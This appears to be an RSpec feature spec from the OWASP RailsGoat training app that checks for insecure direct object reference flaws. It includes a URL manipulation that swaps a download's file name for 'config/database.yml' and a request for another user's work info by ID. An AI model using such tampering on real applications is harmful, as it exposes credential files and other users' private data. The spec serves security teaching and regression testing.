# frozen_string_literal: true
require "spec_helper"

feature "insecure direct object reference" do
  before do
    UserFixture.reset_all_users
    @normal_user = UserFixture.normal_user
  end

  scenario "attack one" do
    login(@normal_user)

    visit "/users/#{@normal_user.id}/benefit_forms"
    download_url = first(".widget-body a")[:href]
    visit download_url.sub(/name=(.*?)&/, "name=config/database.yml&")

    pending if verifying_fixed?

    expect(page.status_code).to eq(200)
    expect(page.response_headers["Content-Disposition"]).to include("database.yml")
    expect(page.response_headers["Content-Length"]).to eq("710")
  end

  scenario "attack two\nTutorial: https://github.com/OWASP/railsgoat/wiki/A4-Insecure-Direct-Object-Reference" do
    login(@normal_user)
    expect(@normal_user.id).not_to eq(2)
    another_user = User.find(2)

    visit "/users/#{another_user.id}/work_info"

    pending if verifying_fixed?
    expect(first("td").text).to eq(another_user.full_name)
  end
end
